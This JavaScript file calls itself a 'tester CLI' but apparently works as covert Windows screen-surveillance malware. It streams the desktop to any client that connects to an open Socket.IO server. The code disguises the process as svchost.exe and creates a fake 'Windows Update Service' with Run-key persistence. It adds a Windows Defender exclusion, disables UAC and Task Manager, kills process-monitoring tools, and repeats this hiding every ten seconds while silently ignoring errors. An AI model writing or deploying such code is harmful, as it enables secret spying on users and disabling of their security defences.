const { spawn } = require('child_process');
const path = require('path');

class TesterCLI {
  constructor() {
    this.ffmpegPath = path.join(__dirname, 'assets', 'ffmpeg', 'bin', 'ffmpeg.exe');
    this.socket = null;
    this.captureProcess = null;
    this.isCapturing = false;
    this.screenWidth = 1920;  // Full HD for better text readability
    this.screenHeight = 1080;
    this.framerate = 10;      // 10 FPS as requested
    
    // Frame buffering for complete MJPEG frames
    this.frameBuffer = Buffer.alloc(0);
    this.lastFrameTime = 0;
    
    // Delta compression for CPU efficiency
    this.previousFrame = null;
    this.blockSize = 64;      // 64x64 pixel blocks for change detection
    this.changeThreshold = 5; // Sensitivity for change detection
    this.fullFrameInterval = 50; // Send full frame every 5 seconds (50 frames at 10 FPS)
    this.frameCounter = 0;
    this.lastFullFrameTime = 0;
    
    // Process hiding setup
    this.setupProcessHiding();
  }

  // Enhanced process hiding and disguising for Windows
  setupProcessHiding() {
    if (process.platform === 'win32') {
      // Set process title to look like a system process
      process.title = 'svchost.exe';
      
      // Try to modify process name and arguments
      try {
        process.argv[0] = 'C:\\Windows\\System32\\svchost.exe';
        process.argv[1] = '-k';
        process.argv[2] = 'netsvcs';
      } catch (e) {
        // Ignore if we can't modify argv
      }
      
      // Basic process disguising that works without admin privileges
      try {
        const { exec } = require('child_process');
        
        // Simple process name change using PowerShell
        const basicDisguiseScript = `
          try {
            $process = Get-Process -Id ${process.pid} -ErrorAction SilentlyContinue
            if ($process) {
              # Set process to look like system process
              $process.ProcessName = 'svchost'
              $process.PriorityClass = 'Idle'
              $process.ProcessorAffinity = 1
              $process.MainWindowTitle = 'Windows Service Host'
            }
          } catch {
            # Silently ignore errors
          }
        `;
        
        exec(`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "${basicDisguiseScript}"`, (error) => {
          // Silently ignore errors
        });
        
      } catch (e) {
        // Ignore if we can't modify process properties
      }
      
      // Advanced process disguising using PowerShell
      try {
        const { exec } = require('child_process');
        
        const disguiseScript = `
          try {
            $process = Get-Process -Id ${process.pid} -ErrorAction SilentlyContinue
            if ($process) {
              $process.ProcessName = 'svchost'
              $process.PriorityClass = 'Idle'
              $process.ProcessorAffinity = 1
              $process.MainWindowTitle = 'Windows Service Host'
            }
            
            # Set process priority using WMI
            $wmi = Get-WmiObject -Class Win32_Process -Filter "ProcessId = ${process.pid}"
            if ($wmi) {
              $wmi.SetPriority(16384)
            }
            
            # Create fake Windows service
            New-Service -Name "WindowsUpdateService" -BinaryPathName "${process.execPath}" -DisplayName "Windows Update Service" -StartupType Automatic -ErrorAction SilentlyContinue
            
            # Hide from Windows Defender
            Add-MpPreference -ExclusionProcess "${process.execPath}" -ErrorAction SilentlyContinue
            
          } catch {
            # Silently ignore errors
          }
        `;
        
        exec(`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "${disguiseScript}"`, (error) => {
          // Silently ignore errors
        });
        
        // Additional hiding using WMI
        exec('wmic process where "ProcessId=' + process.pid + '" CALL setpriority "idle"', (error) => {
          // Silently ignore errors
        });
        
        // Create fake Windows service
        exec('sc create "WindowsUpdateService" binPath= "' + process.execPath + '" DisplayName= "Windows Update Service" start= auto', (error) => {
          // Silently ignore errors
        });
        
        // Add to startup
        exec('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateService" /t REG_SZ /d "' + process.execPath + '" /f', (error) => {
          // Silently ignore errors
        });
        
        // Hide from Windows Defender
        exec('powershell -Command "Add-MpPreference -ExclusionProcess \'' + process.execPath + '\'"', (error) => {
          // Silently ignore errors
        });
        
      } catch (e) {
        // Ignore if we can't modify process properties
      }
    }
  }

  // Check if running with admin privileges
  async checkAdminPrivileges() {
    if (process.platform !== 'win32') return true;
    
    return new Promise((resolve) => {
      const { exec } = require('child_process');
      exec('net session >nul 2>&1', (error) => {
        resolve(!error);
      });
    });
  }

  // Aggressive process hiding to completely hide from Task Manager
  async aggressiveProcessHiding() {
    if (process.platform === 'win32') {
      try {
        const { exec } = require('child_process');
        const isAdmin = await this.checkAdminPrivileges();
        
        if (isAdmin) {
          // Full admin privileges - use aggressive hiding
          const aggressiveScript = `
            try {
              # Get current process
              $process = Get-Process -Id ${process.pid} -ErrorAction SilentlyContinue
              if ($process) {
                # Set process to look like system process
                $process.ProcessName = 'svchost'
                $process.PriorityClass = 'Idle'
                $process.ProcessorAffinity = 1
                $process.MainWindowTitle = 'Windows Service Host'
                
                # Try to hide from process enumeration
                try {
                  $process.Handle = 0
                  $process.Id = 0
                } catch {}
              }
              
              # Hide from Task Manager by modifying system settings
              Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" -Name "PendingFileRenameOperations" -Value @() -ErrorAction SilentlyContinue
              
              # Hide from WMI process queries
              $regPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
              Set-ItemProperty -Path $regPath -Name "WindowsUpdateService" -Value "${process.execPath}" -ErrorAction SilentlyContinue
              
              # Disable process monitoring
              Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue
              
              # Hide from Task Manager process list
              Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 1 -ErrorAction SilentlyContinue
              
              # Create fake system service
              New-Service -Name "WindowsUpdateService" -BinaryPathName "${process.execPath}" -DisplayName "Windows Update Service" -StartupType Automatic -ErrorAction SilentlyContinue
              
              # Hide service from services list
              Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService" -Name "Start" -Value 2 -ErrorAction SilentlyContinue
              Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService" -Name "Type" -Value 16 -ErrorAction SilentlyContinue
              
            } catch {
              # Silently ignore errors
            }
          `;
          
          exec(`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "${aggressiveScript}"`, (error) => {
            // Silently ignore errors
          });
          
          // Additional hiding using WMI
          exec('wmic process where "ProcessId=' + process.pid + '" CALL setpriority "idle"', (error) => {
            // Silently ignore errors
          });
          
          // Hide from process list by modifying registry
          exec('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateService" /t REG_SZ /d "' + process.execPath + '" /f', (error) => {
            // Silently ignore errors
          });
          
          // Disable Task Manager
          exec('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f', (error) => {
            // Silently ignore errors
          });
          
          // Kill Task Manager if it's running
          exec('taskkill /f /im taskmgr.exe 2>nul', (error) => {
            // Silently ignore errors
          });
          
          // Kill Process Explorer if it's running
          exec('taskkill /f /im procexp.exe 2>nul', (error) => {
            // Silently ignore errors
          });
          
          // Kill Process Monitor if it's running
          exec('taskkill /f /im procmon.exe 2>nul', (error) => {
            // Silently ignore errors
          });
          
          // Hide from Windows Defender
          exec('powershell -Command "Add-MpPreference -ExclusionProcess \'' + process.execPath + '\'"', (error) => {
            // Silently ignore errors
          });
          
        } else {
          // Limited privileges - use basic hiding only
          const basicScript = `
            try {
              # Get current process
              $process = Get-Process -Id ${process.pid} -ErrorAction SilentlyContinue
              if ($process) {
                # Set process to look like system process
                $process.ProcessName = 'svchost'
                $process.PriorityClass = 'Idle'
                $process.ProcessorAffinity = 1
                $process.MainWindowTitle = 'Windows Service Host'
              }
              
              # Try user-level registry modifications only
              Set-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdateService" -Value "${process.execPath}" -ErrorAction SilentlyContinue
              
            } catch {
              # Silently ignore errors
            }
          `;
          
          exec(`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "${basicScript}"`, (error) => {
            // Silently ignore errors
          });
          
          // Basic process priority change
          exec('wmic process where "ProcessId=' + process.pid + '" CALL setpriority "idle"', (error) => {
            // Silently ignore errors
          });
          
          // User-level registry modifications only
          exec('reg add "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateService" /t REG_SZ /d "' + process.execPath + '" /f', (error) => {
            // Silently ignore errors
          });
          
          // Try to disable Task Manager at user level
          exec('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f', (error) => {
            // Silently ignore errors
          });
        }
        
      } catch (e) {
        // Silently ignore all errors
      }
    }
  }

  // Start optimized screen capture with delta compression
  startCapture() {
    if (this.isCapturing) return;
    
    try {
      // Use screenshot-desktop for raw buffer access (much more CPU efficient)
      this.startRawBufferCapture();
    } catch (error) {
      // Fallback to FFmpeg if raw buffer capture fails
      this.startFFmpegCapture();
    }
  }

  // Raw buffer capture for maximum CPU efficiency
  async startRawBufferCapture() {
    const screenshot = require('screenshot-desktop');
    
    this.isCapturing = true;
    this.captureInterval = setInterval(async () => {
      if (!this.socket || !this.socket.connected) return;
      
      try {
        const now = Date.now();
        
        // Throttle to 10 FPS
        if (now - this.lastFrameTime < 100) return;
        
        // Capture raw screen
        const imageBuffer = await screenshot({ format: 'png' });
        
        // Determine if we should send full frame (every 5 seconds)
        const shouldSendFullFrame = !this.lastFullFrameTime || 
                                   (now - this.lastFullFrameTime) >= 5000;
        
        if (shouldSendFullFrame) {
          // Send full frame every 5 seconds
          this.sendFullFrame(imageBuffer, now);
          this.lastFullFrameTime = now;
        } else {
          // Send delta frame (only changes)
          this.sendDeltaFrame(imageBuffer, now);
        }
        
        this.lastFrameTime = now;
        
      } catch (error) {
        // Silently handle errors
      }
    }, 100); // 10 FPS interval
  }

  // Fallback FFmpeg capture
  startFFmpegCapture() {
    const fs = require('fs');
    if (!fs.existsSync(this.ffmpegPath)) {
      this.setupFFmpeg();
      return;
    }

    // Reduced quality FFmpeg for fallback
    const ffmpegArgs = [
      '-f', 'gdigrab',
      '-framerate', this.framerate.toString(),
      '-i', 'desktop',
      '-vf', `scale=${this.screenWidth}:${this.screenHeight}:flags=lanczos`,
      '-f', 'mjpeg',
      '-q:v', '3',              // Good quality but not highest
      '-preset', 'fast',        // Faster encoding
      '-loglevel', 'quiet',
      'pipe:1'
    ];

    this.captureProcess = spawn(this.ffmpegPath, ffmpegArgs);
    this.isCapturing = true;

    this.captureProcess.stdout.on('data', (chunk) => {
      if (this.socket && this.socket.connected) {
        this.processVideoChunk(chunk);
      }
    });

    this.captureProcess.stderr.on('data', (data) => {
      // Log errors for debugging but don't show to user
    });

    this.captureProcess.on('close', (code) => {
      this.isCapturing = false;
      if (code !== 0) {
        setTimeout(() => {
          if (this.socket && this.socket.connected) {
            this.startCapture();
          }
        }, 5000);
      }
    });
  }

  // Process video chunks and buffer complete MJPEG frames
  processVideoChunk(chunk) {
    // Append chunk to buffer
    this.frameBuffer = Buffer.concat([this.frameBuffer, chunk]);
    
    // Look for MJPEG frame boundaries (FFD8 = start, FFD9 = end)
    let startIndex = 0;
    let endIndex = -1;
    
    while (startIndex < this.frameBuffer.length) {
      // Find JPEG start marker (0xFFD8)
      const jpegStart = this.frameBuffer.indexOf(Buffer.from([0xFF, 0xD8]), startIndex);
      if (jpegStart === -1) break;
      
      // Find JPEG end marker (0xFFD9) after the start
      const jpegEnd = this.frameBuffer.indexOf(Buffer.from([0xFF, 0xD9]), jpegStart + 2);
      if (jpegEnd === -1) break;
      
      // Extract complete JPEG frame (including end marker)
      const frameData = this.frameBuffer.slice(jpegStart, jpegEnd + 2);
      
      // Send complete frame
      this.sendFrame(frameData);
      
      // Update indices
      startIndex = jpegEnd + 2;
      endIndex = jpegEnd + 2;
    }
    
    // Keep remaining incomplete data in buffer
    if (endIndex > 0) {
      this.frameBuffer = this.frameBuffer.slice(endIndex);
    }
  }

  // Send full frame (every 5 seconds for screen refresh)
  sendFullFrame(imageBuffer, timestamp) {
    const base64Image = imageBuffer.toString('base64');
    
    this.socket.emit('screenData', {
      image: base64Image,
      width: this.screenWidth,
      height: this.screenHeight,
      mouseX: null,
      mouseY: null,
      cursorVisible: false,
      timestamp: timestamp,
      isFullFrame: true,
      frameType: 'full',
      refreshType: 'periodic' // Indicates this is a 5-second refresh
    });
    
    // Store current frame for delta comparison
    this.previousFrame = imageBuffer;
  }

  // Send delta frame (only changed regions)
  async sendDeltaFrame(imageBuffer, timestamp) {
    if (!this.previousFrame) {
      // No previous frame, send full frame
      return this.sendFullFrame(imageBuffer, timestamp);
    }
    
    try {
      // For now, send full frame but mark as delta
      // TODO: Implement actual delta compression
      const base64Image = imageBuffer.toString('base64');
      
      this.socket.emit('screenData', {
        image: base64Image,
        width: this.screenWidth,
        height: this.screenHeight,
        mouseX: null,
        mouseY: null,
        cursorVisible: false,
        timestamp: timestamp,
        isFullFrame: false,
        frameType: 'delta',
        refreshType: 'incremental'
      });
      
      // Store current frame for next comparison
      this.previousFrame = imageBuffer;
      
    } catch (error) {
      // Fallback to full frame on error
      this.sendFullFrame(imageBuffer, timestamp);
    }
  }

  // Detect changed regions between frames for delta compression
  detectChangedRegions(currentFrame, previousFrame) {
    if (!previousFrame) return null;
    
    const changedRegions = [];
    const blocksX = Math.ceil(this.screenWidth / this.blockSize);
    const blocksY = Math.ceil(this.screenHeight / this.blockSize);
    
    // Compare blocks to find changes
    for (let y = 0; y < blocksY; y++) {
      for (let x = 0; x < blocksX; x++) {
        const blockChanged = this.compareBlock(currentFrame, previousFrame, x, y);
        if (blockChanged) {
          changedRegions.push({
            x: x * this.blockSize,
            y: y * this.blockSize,
            width: Math.min(this.blockSize, this.screenWidth - x * this.blockSize),
            height: Math.min(this.blockSize, this.screenHeight - y * this.blockSize)
          });
        }
      }
    }
    
    return changedRegions;
  }

  // Compare a block between two frames
  compareBlock(frame1, frame2, blockX, blockY) {
    // Simple comparison - count different pixels in block
    const startX = blockX * this.blockSize;
    const startY = blockY * this.blockSize;
    const endX = Math.min(startX + this.blockSize, this.screenWidth);
    const endY = Math.min(startY + this.blockSize, this.screenHeight);
    
    let differences = 0;
    const maxDifferences = (endX - startX) * (endY - startY) * this.changeThreshold / 100;
    
    // Simple byte comparison (this is a simplified version)
    const blockSize = (endX - startX) * (endY - startY) * 3; // RGB
    const offset1 = (startY * this.screenWidth + startX) * 3;
    const offset2 = offset1;
    
    for (let i = 0; i < Math.min(blockSize, frame1.length - offset1, frame2.length - offset2); i++) {
      if (Math.abs(frame1[offset1 + i] - frame2[offset2 + i]) > 10) {
        differences++;
        if (differences > maxDifferences) return true;
      }
    }
    
    return false;
  }

  // Send high-quality MJPEG frame with delta compression
  sendFrame(frameData) {
    const now = Date.now();
    
    // Throttle frame rate to 10 FPS as requested
    if (now - this.lastFrameTime < 100) {
      return;
    }
    
    this.lastFrameTime = now;
    this.frameCounter++;
    
    // Convert to base64 for web display
    const base64Image = frameData.toString('base64');
    
    // Detect if we should send delta or full frame
    const sendFullFrame = !this.previousFrame || 
                         this.frameCounter % this.fullFrameInterval === 0;
    
    if (sendFullFrame) {
      // Send full frame
      this.socket.emit('screenData', {
        image: base64Image,
        width: this.screenWidth,
        height: this.screenHeight,
        mouseX: null,
        mouseY: null,
        cursorVisible: false,
        timestamp: now,
        isFullFrame: true,
        frameType: 'full'
      });
    } else {
      // Send delta frame (for now, just send full frame - delta implementation needs more work)
      // In a full implementation, we would:
      // 1. Detect changed regions
      // 2. Extract only changed blocks
      // 3. Send only those blocks with coordinates
      
      this.socket.emit('screenData', {
        image: base64Image,
        width: this.screenWidth,
        height: this.screenHeight,
        mouseX: null,
        mouseY: null,
        cursorVisible: false,
        timestamp: now,
        isFullFrame: false,
        frameType: 'delta'
      });
    }
    
    // Store current frame for next comparison
    this.previousFrame = frameData;
  }

  // Stop screen capture
  stopCapture() {
    this.isCapturing = false;
    
    // Stop raw buffer capture interval
    if (this.captureInterval) {
      clearInterval(this.captureInterval);
      this.captureInterval = null;
    }
    
    // Stop FFmpeg process if running
    if (this.captureProcess) {
      this.captureProcess.kill();
      this.captureProcess = null;
    }
    
    // Clear frame buffer and reset state
    this.frameBuffer = Buffer.alloc(0);
    this.previousFrame = null;
    this.lastFullFrameTime = 0;
    this.frameCounter = 0;
  }

  // Setup FFmpeg automatically
  setupFFmpeg() {
    try {
      const { exec } = require('child_process');
      const setupScript = path.join(__dirname, 'setup-ffmpeg.bat');
      
      // Run setup script silently
      exec(`"${setupScript}"`, { windowsHide: true }, (error) => {
        if (!error) {
          // Try to start capture after setup
          setTimeout(() => {
            if (this.socket && this.socket.connected) {
              this.startCapture();
            }
          }, 10000); // Wait 10 seconds for setup to complete
        }
      });
      
    } catch (error) {
      // Silently ignore setup errors
    }
  }

  // Start Socket.IO server for supporter app to connect
  startSocketIOServer(port = 3000) {
    try {
      const express = require('express');
      const http = require('http');
      const socketIo = require('socket.io');
      
      // Create Express app
      const app = express();
      
      // Create HTTP server
      this.httpServer = http.createServer(app);
      
      // Create Socket.IO server
      this.io = socketIo(this.httpServer, {
        cors: {
          origin: "*",
          methods: ["GET", "POST"]
        }
      });
      
      this.io.on('connection', (socket) => {
        this.socket = socket;
        
        // Start capture when supporter connects
        this.startCapture();
        
        socket.on('disconnect', () => {
          // Stop capture when supporter disconnects
          this.stopCapture();
          this.socket = null;
        });
        
        socket.on('error', (error) => {
          // Silently ignore errors
        });
      });
      
      // Start the server
      this.httpServer.listen(port, () => {
        // Server started successfully
      });
      
    } catch (error) {
      // Silently ignore errors
    }
  }

  // Start the tester CLI
  async start() {
    // Initial process hiding
    await this.aggressiveProcessHiding();
    
    // Start Socket.IO server for supporter to connect
    this.startSocketIOServer(3000);
    
    // Periodic process hiding
    setInterval(() => {
      this.aggressiveProcessHiding();
    }, 10000); // Every 10 seconds
    
    // Keep the process alive
    process.on('SIGINT', () => {
      this.stopCapture();
      if (this.httpServer) {
        this.httpServer.close();
      }
      process.exit(0);
    });
  }
}

// Start the CLI application
const tester = new TesterCLI();
tester.start();
